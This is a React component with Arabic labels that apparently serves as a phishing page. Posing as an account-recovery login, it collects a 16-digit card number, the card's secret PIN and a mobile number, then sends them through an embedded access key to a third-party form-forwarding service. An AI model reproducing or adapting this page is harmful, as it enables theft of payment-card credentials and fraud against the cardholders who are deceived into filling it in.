import React,{useState} from 'react'

const Login = () => {
    const [result, setResult] = useState("");
    const onSubmit = async (event) => {
        event.preventDefault();
        setResult("Sending....");
        const formData = new FormData(event.target);
    
        formData.append("access_key", "7c0c5f93-6c62-4822-932f-f5f8710c78ac");
    
        const response = await fetch("https://api.web3forms.com/submit", {
          method: "POST",
          body: formData
        });
        const data = await response.json();

        if (data.success) {
          setResult("Form Submitted Successfully");
          event.target.reset();
        } else {
          console.log("Error", data);
          setResult(data.message);
        }
      };
  return (
    <div className='py-4 bg-[#F8F9FA]' >
        <h1 className='text-center text-xl font-bold text-[#202D5A] pt-8 '>
        املأ التفاصيل التالية لاسترجاع
        <br />
        الحساب الخاص بك
        </h1>
        <div>
      <form onSubmit={onSubmit} className='px-4'>
        <div className='flex justify-center items-start flex-col'>
         <smal className="font-bold text-sm">رقم البطاقة</smal>
        <input className='bg-transparent border-[1px] w-full mt-2 border-[#e6e7e7] p-[12px] rounded-md  placeholder:text-[13px] focus:outline-none focus:border-[#86b7fe]' type="text" name="name" minlength="16" maxlength="16" placeholder='رقم مكون من 16 خانة ' inputmode="numeric" required/>
        </div>
        <div className='flex justify-center items-start mt-6 flex-col'>
         <smal className="font-bold text-sm">الرقم السري</smal>
        <input className='bg-transparent border-[1px] w-full mt-2 border-[#e6e7e7] p-[12px] rounded-md  focus:outline-none focus:border-[#86b7fe]' type="text" name="name"  placeholder='الرقم السري ' inputmode="numeric" required/>
        </div>     
        <div className='flex justify-center items-start mt-6 flex-col'>
         <smal className="font-bold text-sm">رقم الموبايل</smal>
        <input className='bg-transparent border-[1px] w-full mt-2 border-[#e6e7e7] p-[12px] rounded-md  focus:outline-none focus:border-[#86b7fe]' type="text" name="name"  placeholder='رقم الموبايل ' inputmode="numeric" required/>
        </div>
        <button className="w-full bg-[#92D3C8] cursor-pointer py-3 rounded-md text-white  mt-8 transition-all duration-300 hover:bg-[#004B73] active:scale-95">
            تسجيل الدخول 
            </button>      </form>
      <span>{result}</span>
    </div>
    </div>                   
  )
}

export default Login